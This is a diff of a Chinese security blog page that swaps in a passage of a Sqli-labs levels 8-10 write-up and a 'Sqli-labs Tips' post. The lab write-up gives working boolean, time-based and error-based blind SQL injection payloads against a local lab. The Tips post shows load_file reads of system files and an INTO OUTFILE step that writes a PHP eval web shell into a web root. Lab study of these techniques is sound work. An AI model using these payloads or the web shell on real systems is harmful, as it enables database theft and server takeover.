+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-2.png" alt="8-2"></p>
+<p>嗯？返回正常结果了，那我们就可以猜，原文件对<strong>ID</strong>的处理只是简单的<strong>单引号</strong></p>
+<p>查看 <strong>index.php</strong> 文件，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>那么这关也是使用盲注，但是却只能用<strong>布尔注入</strong>和<strong>延时注入</strong></p>
+<p>这关<strong>报错注入无法使用</strong></p>
+<p><strong>布尔注入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;a&apos; --+</span><br><span class="line"></span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;s&apos; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-3.png" alt="8-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-4.png" alt="8-4"></p>
+<p><strong>延时注入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-5.png" alt="8-5"></p>
+<p><strong>报错注入（无法使用）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and extractvalue(1,concat(0x3a,(select database()),0x3a)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-6.png" alt="8-6"></p>
+<hr>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less - 9"></a>Less - 9</h2><p>题目的标题是<strong>Blind- Time based- Single Quotes</strong>，翻译就是<strong>盲注—基于时间—单引号</strong></p>
+<p>那么我们就根据提示去做题了</p>
+<p>从源代码我们可以看出，不管你做什么，它都只返回<strong>You are in ……..</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-1.png" alt="9-1"></p>
+<p><strong>爆数据库名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-2.png" alt="9-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-3.png" alt="9-3"></p>
+<p>从上面这2张图我们也可以看出，不管输入什么都只返回<strong>You are in ……..</strong>，所以只能根据<strong>响应时间</strong>来判断</p>
+<p>……</p>
+<p>不断尝试之后，我们知道数据库名是<strong>security</strong></p>
+<p><strong>爆security数据库下的表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1)&gt;&apos;r&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第四个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>慢慢地爆出security下的表名：emails，referers，uagents，users</p>
+<p><strong>爆users表下的列名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)&gt;&apos;i&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),1,1)&gt;&apos;p&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>慢慢地爆出users下的列名：id，username，password</p>
+<p><strong>爆users表下的username列的数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select username from users limit 0,1),1,1)&gt;&apos;d&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>爆出第一行的数据是dumb</p>
+<hr>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less - 10"></a>Less - 10</h2><p>题目的标题是<strong>Blind- Time based- Double Quotes</strong>，翻译就是<strong>盲注—基于时间—双引号</strong></p>
+<p>那么这关和第9关的差别就只是<strong>单引号</strong>和<strong>双引号</strong>的问题了</p>
+<p>就不再赘述了，可以自己去尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-10/?id=1&quot; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/10-1.png" alt="10-1"></p>
+<hr>
+<h3 id="至此，1-10关的Write-up结束"><a href="#至此，1-10关的Write-up结束" class="headerlink" title="至此，1-10关的Write-up结束"></a>至此，1-10关的Write-up结束</h3><h3 id="后一部分链接：第11-20关Write-up"><a href="#后一部分链接：第11-20关Write-up" class="headerlink" title="后一部分链接：第11-20关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3>
       
 
       
@@ -436,7 +922,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
         		</li>
       		
 		</ul>
@@ -446,7 +932,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/22/PHP语法（十一）—条件结构/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/">展开全文 >></a>
         </p>
       
 
@@ -476,30 +962,110 @@
 
 
   
-    <article id="post-PHP语法（十）—继承" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Sqli-labs Tips" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/21/PHP语法（十）—继承/">PHP语法（十） — 继承</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/01/28/Sqli-labs Tips/">Sqli-labs Tips</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/21/PHP语法（十）—继承/" class="archive-article-date">
-  	<time datetime="2019-02-20T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-21</time>
+        <a href="/Knlvre.github-io/2019/01/28/Sqli-labs Tips/" class="archive-article-date">
+  	<time datetime="2019-01-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>子类继承父类的所有公有和保护方法。但是子类的方法会覆盖父类的方法</p>
+        <h2 id="Tip-1-——-基础知识点"><a href="#Tip-1-——-基础知识点" class="headerlink" title="Tip 1 —— 基础知识点"></a>Tip 1 —— 基础知识点</h2><h4 id="（1）简单的用于尝试的语句"><a href="#（1）简单的用于尝试的语句" class="headerlink" title="（1）简单的用于尝试的语句"></a>（1）简单的用于尝试的语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line"></span><br><span class="line">ps:--+和#可以互相替换</span><br></pre></td></tr></table></figure>
+<h4 id="（2）mysql命令行的简单命令"><a href="#（2）mysql命令行的简单命令" class="headerlink" title="（2）mysql命令行的简单命令"></a>（2）mysql命令行的简单命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看所有的数据库</span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">使用某个数据库(比如security数据库)</span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">查看我们使用的数据库中有哪些表</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">看一下我们想要查看的表的内容(比如users表)</span><br><span class="line">desc users;</span><br></pre></td></tr></table></figure>
+<h4 id="（3）利用-information-schema-数据库进行注入的命令"><a href="#（3）利用-information-schema-数据库进行注入的命令" class="headerlink" title="（3）利用 information_schema 数据库进行注入的命令"></a>（3）利用 <strong>information_schema</strong> 数据库进行注入的命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line"></span><br><span class="line">猜某库的所有表(比如security数据库)</span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;security&apos;</span><br><span class="line"></span><br><span class="line">猜某表的所有列(比如user表)</span><br><span class="line">select column_name from information_schema.columns where table_name=&apos;user&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="（4）-order-by-命令"><a href="#（4）-order-by-命令" class="headerlink" title="（4） order by 命令"></a>（4） <strong>order by</strong> 命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列</span><br><span class="line">比如：security-uers表中有3列，可以order by 1 ;order by 2;order by 3;分别是对第1，2，3列排序</span><br><span class="line">比如：security-email表中有2列，可以order by 1 ;order by 2;分别是对第1，2列排序</span><br><span class="line"></span><br><span class="line">ps：如果某一个表只有X列，当order by x+1时，就会开始出错，这一点可以用来猜表有多少列</span><br><span class="line">具体例子可以看less-1中的讲解</span><br></pre></td></tr></table></figure>
+<h4 id="（5）-union-命令"><a href="#（5）-union-命令" class="headerlink" title="（5） union 命令"></a>（5） <strong>union</strong> 命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union的作用是将两个sql语句进行联合</span><br><span class="line">union前后的两个sql语句的选择列数要相同才可以</span><br><span class="line">具体理解看less-1里的例子</span><br></pre></td></tr></table></figure>
+<h4 id="（6）几个常用函数"><a href="#（6）几个常用函数" class="headerlink" title="（6）几个常用函数"></a>（6）几个常用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MySQL版本：version()</span><br><span class="line">数据库用户名：user()</span><br><span class="line">数据库名：database()</span><br><span class="line">数据库路径：@@datadir</span><br><span class="line">操作系统版本：@@version_compile_os</span><br></pre></td></tr></table></figure>
+<h4 id="（7）Limit的用法"><a href="#（7）Limit的用法" class="headerlink" title="（7）Limit的用法"></a>（7）Limit的用法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">limit 0，1				//表示从第1行开始，显示1行</span><br><span class="line">limit 1，3				//表示从第2行开始，显示3行</span><br><span class="line"></span><br><span class="line">可以参考以下图片看详细用法：</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/0.png" alt="0"></p>
 <hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、继承"><a href="#一、继承" class="headerlink" title="一、继承"></a>一、继承</h3><h4 id="1-1-输入代码"><a href="#1-1-输入代码" class="headerlink" title="1.1 输入代码"></a>1.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//创建父类 Person</span><br><span class="line">class Person&#123;</span><br><span class="line">    function read($name)&#123;</span><br><span class="line">        echo &quot;【&quot;.$name.&quot;】喜欢三毛的作品。&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function doing($name)&#123;</span><br><span class="line">        echo &quot;【&quot;.$name.&quot;】 喜欢打篮球&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//创建Person的子类Student</span><br><span class="line">class Student extends Person&#123;</span><br><span class="line">    function eat($name)&#123;</span><br><span class="line">        echo &quot;【&quot;.$name.&quot;】 喜欢吃甜食&lt;/br&gt;&quot;;        </span><br><span class="line">    &#125;</span><br><span class="line">    function doing($name)&#123;</span><br><span class="line">        echo &quot;【&quot;.$name.&quot;】 喜欢打游戏&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Person();	//创建父类对象</span><br><span class="line">$b = new Student();	//创建子类对象</span><br><span class="line">$b -&gt; read(&quot;素白&quot;);	//子类对象调用父类对象中的方法</span><br><span class="line">$b -&gt; eat(&quot;素白&quot;);	//子类对象调用自己的方法</span><br><span class="line">echo &quot;----------分隔符----------&lt;/br&gt;&quot;;</span><br><span class="line">$a -&gt; doing(&quot;素白&quot;);	//父类对象调用自己的方法</span><br><span class="line">$b -&gt; ding(&quot;素白&quot;);	//子类对象调用父类对象的同名方法，与父类自掉形成对比</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-查看结果"><a href="#1-2-查看结果" class="headerlink" title="1.2 查看结果"></a>1.2 查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E7%BB%A7%E6%89%BF/1-2.png" alt="1-2"></p>
+<h2 id="Tip-2-——-关于盲注的知识点"><a href="#Tip-2-——-关于盲注的知识点" class="headerlink" title="Tip 2 —— 关于盲注的知识点"></a>Tip 2 —— 关于盲注的知识点</h2><p>什么是盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注的类型分为以下三种：</p>
+<ul>
+<li>基于布尔SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+<p>关于这方面知识的文章很多，我们这里就只做简单介绍</p>
+<h4 id="（1）基于布尔SQL盲注"><a href="#（1）基于布尔SQL盲注" class="headerlink" title="（1）基于布尔SQL盲注"></a>（1）基于布尔SQL盲注</h4><p>常用的函数：<strong>left()，substr()，mid()，ascii()，ord()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(string,length)	  	//left()函数用于截取字符串string的前length个字符</span><br><span class="line"></span><br><span class="line">substr(string,start,length)	//substr()函数用于截取字符串string，从start位置开始，截取length长度</span><br><span class="line"></span><br><span class="line">mid(string,start,length)	//mid()函数功能和substr()函数一样</span><br><span class="line"></span><br><span class="line">ascii(string)			//ascii()函数用于将字符串string转换成ASCII码</span><br><span class="line"></span><br><span class="line">ord()				//ord()函数功能和ascii()函数一样</span><br></pre></td></tr></table></figure>
+<p>举几个<strong>栗子</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(database(),3)</span><br><span class="line">//database()用于显示数据库名称，3表示截取前3位，如database名称为&quot;security&quot;，那么结果就是&quot;sec&quot;</span><br><span class="line"></span><br><span class="line">left(database(),1) &gt; &apos;w&apos;</span><br><span class="line">//这个语句结果是否定的，因为&quot;security&quot;截取前1个字符是&quot;s&quot;，在26个字母顺序中&quot;s&quot;是在&quot;w&quot;前面的,</span><br><span class="line">所以是小于。如果将表达式的&quot;w&quot;换成&quot;a&quot;，则结果是肯定的</span><br><span class="line"></span><br><span class="line">substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)</span><br><span class="line">//首先string部分的结果是&quot;email&quot;，那么这整个语句的结果是&quot;a&quot;。关于limit的用法，可以在Tip 1上面看到</span><br></pre></td></tr></table></figure>
+<p>另外，关于正则表达式可以参考这篇文章：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">盲注之正则表达式</a></p>
+<h4 id="（2）基于报错的SQL盲注"><a href="#（2）基于报错的SQL盲注" class="headerlink" title="（2）基于报错的SQL盲注"></a>（2）基于报错的SQL盲注</h4><p>什么是报错盲注：构造payload让信息通过错误提示回显出来</p>
+<p>这里我们简单了解一下 <strong>extractvalue()和concat()</strong> 函数的用法就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line">//这个函数执行后会将数据库的名称通过报错方式显示出来</span><br></pre></td></tr></table></figure>
+<h4 id="（3）基于时间的SQL盲注"><a href="#（3）基于时间的SQL盲注" class="headerlink" title="（3）基于时间的SQL盲注"></a>（3）基于时间的SQL盲注</h4><p>什么是时间盲注：原理于布尔盲注差不多，只不过添加控制时间的函数：当结果正确（错误）时，让页面停留n秒后再返回结果</p>
+<p>常用函数：<strong>if()，sleep()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)	//如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</span><br><span class="line">sleep(n)		//睡眠n秒</span><br></pre></td></tr></table></figure>
+<p>举个<strong>栗子</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr(database(),1,1))=&apos;s&apos;,0,sleep(5))	//如果数据库的名称的第一个字符是&apos;s&apos;，就直接返回结果，不然就延时5秒再返回结果</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Tip-3-——-导入导出文件知识点"><a href="#Tip-3-——-导入导出文件知识点" class="headerlink" title="Tip 3 —— 导入导出文件知识点"></a>Tip 3 —— 导入导出文件知识点</h2><p>1、load_file()导出文件</p>
+<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+<p>使用条件：</p>
+<ol>
+<li>必须有权限读取并且文件必须完全可读 </li>
+</ol>
+<p>​    and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。</p>
+<p>​    and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权</p>
+<ol start="2">
+<li><p>欲读取文件必须在服务器上 </p>
+</li>
+<li><p>必须指定文件完整的路径 </p>
+</li>
+<li><p>欲读取文件必须小于 max_allowed_packet</p>
+</li>
+</ol>
+<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load_file出来。</p>
+<p>在实际的注入中，我们有两个难点需要解决：</p>
+<ol>
+<li><p>绝对物理路径</p>
+</li>
+<li><p>构造有效的畸形语句 （报错爆出绝对路径）</p>
+</li>
+</ol>
+<p>在很多PHP程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p>
+<p>常用路径：<br><a href="http://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5729087.html</a></p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))</span><br></pre></td></tr></table></figure>
+<p>利用hex()将文件内容导出来，尤其是smb文件时可以使用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) </span><br><span class="line">Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII代码</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) </span><br><span class="line">Explain：“c:/boot.ini”的16进制是“0x633a2f626f6f742e696e69”</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(c:\\boot.ini) </span><br><span class="line">Explain:路径里的/用 \\代替</span><br></pre></td></tr></table></figure>
+<p>2、文件导入到数据库</p>
+<p>LOAD DATA INFILE语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
+<p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。</p>
+<p>函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考mysql的文档。（提醒：参考文档才是最佳的学习资料）</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &apos;/tmp/t0.txt&apos; ignore into table t0 character set gbk fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos;</span><br></pre></td></tr></table></figure>
+<p>3、导入到文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT.....INTO OUTFILE &apos;file_name&apos;</span><br></pre></td></tr></table></figure>
+<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。</p>
+<p>我们一般有两种利用形式：</p>
+<p>第一种直接将select内容导入到文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>
+<p>此处将version()替换成一句话，&lt;?php @eval($_post[“mima”])?&gt;也即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select  &lt;?php @eval($_post[“mima”])?&gt;  into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>
+<p>直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p>
+<p>第二种修改文件结尾：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16进制文件</span><br></pre></td></tr></table></figure>
+<p>解释：通常是用\r\n结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY</p>
+<p>16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5505110.html</a></p>
+<p>注意：</p>
+<p>（1）可能在文件路径当中要注意转义，这个要看具体的环境</p>
+<p>（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’</span><br></pre></td></tr></table></figure>
+<p>可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p>
 
       
 
@@ -513,7 +1079,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
         		</li>
       		
 		</ul>
@@ -523,7 +1089,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/21/PHP语法（十）—继承/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/01/28/Sqli-labs Tips/">展开全文 >></a>
         </p>
       
 
